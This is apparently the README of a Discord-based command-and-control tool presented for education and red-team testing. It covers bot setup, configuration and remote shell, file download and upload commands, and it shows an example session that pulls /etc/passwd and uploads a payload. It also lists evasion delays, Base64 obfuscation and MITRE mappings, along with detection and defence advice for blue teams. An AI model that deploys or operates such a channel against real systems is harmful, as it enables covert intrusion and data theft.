# Discord C2 Framework

A Discord-based Command and Control (C2) framework designed for educational purposes and security awareness. This tool demonstrates how legitimate communication platforms can be leveraged as covert command channels.

## ⚠️ Legal Disclaimer

**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY.**

Unauthorized access to computer systems is illegal. This tool should only be used:
- In controlled lab environments
- On systems you own
- With explicit written permission from system owners
- For authorized penetration testing engagements
- For educational and research purposes

The authors assume no liability for misuse of this software.

## Overview

This framework consists of two Python scripts:
- **c2_bot.py**: The main C2 bot that executes commands on the target system
- **helper-script.py**: A companion bot that decodes Base64-encoded outputs for easier reading

## Features

- Remote command execution via Discord messages
- File upload/download capabilities
- Directory listing functionality
- Base64 encoding for basic obfuscation
- Configurable delays to evade detection
- Authorization controls (single user/channel)
- Automated output decoding with helper bot

## Prerequisites

- Python 3.7 or higher
- Discord account
- Discord server with appropriate permissions

## Installation

1. Clone the repository:
```bash
git clone https://github.com/AibelKingslayer/DC2.git
cd DC2
```

2. Install required dependencies:
```bash
pip install discord.py
```

## Discord Bot Setup

### Creating Your Discord Bot

1. **Go to Discord Developer Portal**
   - Navigate to https://discord.com/developers/applications
   - Click "New Application"
   - Give it a name and click "Create"

2. **Create a Bot User**
   - Click on "Bot" in the left sidebar
   - Click "Add Bot"
   - Confirm by clicking "Yes, do it!"
   - Copy the bot token (you'll need this for configuration)

3. **Configure Bot Permissions**
   - Under "Privileged Gateway Intents", enable:
     - Message Content Intent
   - Under "Bot Permissions", select:
     - Read Messages/View Channels
     - Send Messages
     - Attach Files
     - Read Message History

4. **Invite Bot to Your Server**
   - Go to "OAuth2" → "URL Generator"
   - Select scopes: `bot`
   - Select permissions: `Send Messages`, `Read Messages`, `Attach Files`, `Read Message History`
   - Copy the generated URL and open it in your browser
   - Select your server and authorize the bot

5. **Get Channel ID**
   - Enable Developer Mode in Discord (User Settings → Advanced → Developer Mode)
   - Right-click on the channel you want to use
   - Click "Copy ID"

6. **Get User ID**
   - Right-click on your username in Discord
   - Click "Copy ID"

## Configuration

### Configuring c2_bot.py

Open `c2_bot.py` and replace the following placeholders:
```python
DISCORD_TOKEN = "your_bot_token_here"  # Bot token from Discord Developer Portal
CHANNEL_ID = 123456789012345678         # Channel ID where bot will listen
AUTHORIZED_USER_ID = 123456789012345678 # Your Discord user ID
```

Optional configuration:
```python
BOT_PREFIX = "$"          # Command prefix (default: $)
DELAY_SECONDS = 10        # Delay between operations (default: 10)
```

### Configuring helper-script.py (Optional)

If you want to use the helper bot for automatic output decoding:
```python
DISCORD_TOKEN = "helper_bot_token_here"  # Different bot token
CHANNEL_ID = 123456789012345678           # Same channel as C2 bot
C2_BOT_USER_ID = 123456789012345678      # The C2 bot's user ID
```

**Note:** You'll need to create a second Discord bot following the same steps above.

## Usage

### Starting the C2 Bot
```bash
python c2_bot.py
```

### Starting the Helper Bot (Optional)

In a separate terminal:
```bash
python helper-script.py
```

### Available Commands

All commands must be prefixed with `$` (or your configured prefix) in the Discord channel:

#### System Commands
```
$<command>              Execute shell command
$whoami                 Display current user
$pwd                    Show current directory
$ls                     List directory contents (Linux/Mac)
$dir                    List directory contents (Windows)
```

#### File Operations
```
$download <filepath>    Download file from target system
$upload <filepath>      Upload file to target system (bot will wait for attachment)
$list <directory>       List files in specified directory
```

#### Bot Control
```
$exit                   Shutdown the C2 bot
$quit                   Shutdown the C2 bot
```

### Example Session
```
User: $whoami
Bot: ```
    dXNlcm5hbWU=
```
Helper: Decoded Output:
```
username
```

User: $download /etc/passwd
Bot: [Sends file as attachment]

User: $upload /tmp/payload.sh
Bot: 
```
    V2FpdGluZyBmb3IgZmlsZSB1cGxvYWQgdG86IC90bXAvcGF5bG9hZC5zaC4uLgo=
```
[User uploads file]
Bot: 
```
    U2F2ZWQgZmlsZSB0bzogL3RtcC9wYXlsb2FkLnNoCg==
```

User: $list /tmp
Bot: 
```
    TGlzdGluZyBmaWxlcyBpbiAvdG1wOgpmaWxlMS50eHQKZmlsZTIudHh0
```

## Technical Details

### MITRE ATT&CK Mapping

This tool demonstrates the following techniques:

- **T1071.001** - Application Layer Protocol: Web Protocols
- **T1102.002** - Web Service: Bidirectional Communication
- **T1132.001** - Data Encoding: Standard Encoding (Base64)
- **T1041** - Exfiltration Over C2 Channel
- **T1105** - Ingress Tool Transfer

### Detection Opportunities

Security teams can detect this activity by:

1. **Network Monitoring**
   - Unusual Discord API traffic patterns
   - High frequency of API calls from non-standard applications
   - Outbound connections to Discord endpoints from servers

2. **Endpoint Detection**
   - Python processes with Discord library imports
   - Processes making Discord API calls
   - Unusual subprocess execution patterns

3. **Behavioral Analysis**
   - Base64 encoding/decoding operations
   - File uploads to Discord from system directories
   - Command execution with artificial delays

### Limitations

- Basic Base64 encoding (easily detected)
- Static delays (pattern-based detection possible)
- Single-channel operation (limited scalability)
- No encryption beyond Discord's TLS
- Requires bot token (compromise = full access)
- Limited error handling for complex commands

## Security Considerations

### For Red Teams
- Use in authorized engagements only
- Consider additional obfuscation techniques
- Implement proper OPSEC
- Clean up artifacts after testing

### For Blue Teams
- Monitor Discord API usage in your environment
- Implement application whitelisting
- Use EDR solutions to detect suspicious Python scripts
- Monitor for Base64 encoding patterns
- Analyze outbound network connections

## Educational Use Cases

- Understanding C2 communication channels
- Practicing detection and response procedures
- Red team training exercises
- Blue team detection capability testing
- Security awareness demonstrations

## Improvements and Contributions

This is an educational tool. Potential improvements for learning:

- Implement proper encryption
- Add multi-channel support
- Create modular command structure
- Add persistence mechanisms (for lab testing)
- Implement better error handling
- Add logging capabilities

Pull requests for educational enhancements are welcome!

## Defense Recommendations

Organizations should:

1. Block or monitor Discord traffic on servers
2. Implement application control policies
3. Monitor for unusual Python script execution
4. Use EDR solutions with behavioral detection
5. Conduct regular security awareness training
6. Implement network segmentation
7. Monitor outbound HTTPS connections

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Discord API Documentation](https://discord.com/developers/docs/intro)

## Acknowledgments

Created for educational purposes to help security professionals understand modern C2 techniques and improve defensive capabilities.

---

**Remember: Use responsibly and legally. Unauthorized computer access is a crime.**
